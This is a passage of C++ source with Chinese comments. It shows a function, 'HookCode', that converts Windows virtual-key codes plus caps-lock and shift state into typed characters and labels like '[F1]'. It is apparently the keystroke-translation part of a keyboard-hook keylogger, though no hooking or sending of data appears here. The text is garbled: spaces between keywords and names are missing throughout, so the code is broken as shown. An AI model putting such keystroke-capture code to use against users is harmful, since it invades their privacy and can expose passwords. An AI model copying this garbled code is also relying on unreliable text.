    //参数2：是否按下大写按键，TRUE代表按下
    //参数3：是否按住shift按键，TRUE代表正按住
    //参数4：函数返回的按键字符，存储在Out指针指向的内存。
    //返回值：无
    *********************************************************/
    voidHookCode(DWORDcode, BOOLcaps, BOOLshift, char*Out)
    {
    std::stringkey;
    switch (code) // SWITCH ON INT
      {
    // Char keys for ASCI
    // No VM Def in header
    case0x41: key=caps? (shift?"a" : "A") : (shift?"A" : "a"); break;
    case0x42: key=caps? (shift?"b" : "B") : (shift?"B" : "b"); break;
    case0x43: key=caps? (shift?"c" : "C") : (shift?"C" : "c"); break;
    case0x44: key=caps? (shift?"d" : "D") : (shift?"D" : "d"); break;
    case0x45: key=caps? (shift?"e" : "E") : (shift?"E" : "e"); break;
    case0x46: key=caps? (shift?"f" : "F") : (shift?"F" : "f"); break;
    case0x47: key=caps? (shift?"g" : "G") : (shift?"G" : "g"); break;
    case0x48: key=caps? (shift?"h" : "H") : (shift?"H" : "h"); break;
    case0x49: key=caps? (shift?"i" : "I") : (shift?"I" : "i"); break;
    case0x4A: key=caps? (shift?"j" : "J") : (shift?"J" : "j"); break;
    case0x4B: key=caps? (shift?"k" : "K") : (shift?"K" : "k"); break;
    case0x4C: key=caps? (shift?"l" : "L") : (shift?"L" : "l"); break;
    case0x4D: key=caps? (shift?"m" : "M") : (shift?"M" : "m"); break;
    case0x4E: key=caps? (shift?"n" : "N") : (shift?"N" : "n"); break;
    case0x4F: key=caps? (shift?"o" : "O") : (shift?"O" : "o"); break;
    case0x50: key=caps? (shift?"p" : "P") : (shift?"P" : "p"); break;
    case0x51: key=caps? (shift?"q" : "Q") : (shift?"Q" : "q"); break;
    case0x52: key=caps? (shift?"r" : "R") : (shift?"R" : "r"); break;
    case0x53: key=caps? (shift?"s" : "S") : (shift?"S" : "s"); break;
    case0x54: key=caps? (shift?"t" : "T") : (shift?"T" : "t"); break;
    case0x55: key=caps? (shift?"u" : "U") : (shift?"U" : "u"); break;
    case0x56: key=caps? (shift?"v" : "V") : (shift?"V" : "v"); break;
    case0x57: key=caps? (shift?"w" : "W") : (shift?"W" : "w"); break;
    case0x58: key=caps? (shift?"x" : "X") : (shift?"X" : "x"); break;
    case0x59: key=caps? (shift?"y" : "Y") : (shift?"Y" : "y"); break;
    case0x5A: key=caps? (shift?"z" : "Z") : (shift?"Z" : "z"); break;
    // Sleep Key
    caseVK_SLEEP: key="[SLEEP]"; break;
    // Num Keyboard
    caseVK_NUMPAD0:  key="0"; break;
    caseVK_NUMPAD1:  key="1"; break;
    caseVK_NUMPAD2: key="2"; break;
    caseVK_NUMPAD3:  key="3"; break;
    caseVK_NUMPAD4:  key="4"; break;
    caseVK_NUMPAD5:  key="5"; break;
    caseVK_NUMPAD6:  key="6"; break;
    caseVK_NUMPAD7:  key="7"; break;
    caseVK_NUMPAD8:  key="8"; break;
    caseVK_NUMPAD9:  key="9"; break;
    caseVK_MULTIPLY: key="*"; break;
    caseVK_ADD:      key="+"; break;
    caseVK_SEPARATOR: key="-"; break;
    caseVK_SUBTRACT: key="-"; break;
    caseVK_DECIMAL:  key="."; break;
    caseVK_DIVIDE:   key="/"; break;
    // Function Keys
    caseVK_F1:  key="[F1]"; break;
    caseVK_F2:  key="[F2]"; break;
    caseVK_F3:  key="[F3]"; break;
